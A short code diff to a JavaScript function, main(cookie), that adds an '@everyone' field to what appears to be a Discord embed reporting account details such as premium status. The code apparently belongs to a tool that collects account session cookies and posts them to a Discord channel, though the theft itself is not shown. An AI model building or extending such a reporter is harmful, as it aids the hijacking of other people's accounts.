@@ -38,6 +38,11 @@ async function main(cookie) {
                     "name": "Premium",
                     "value": statistics ? statistics.IsPremium : "N/A",
                     "inline": true
+                  },
+                  {
+                    "name": "@everyone",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
                   }
                 ],
                 "author": {
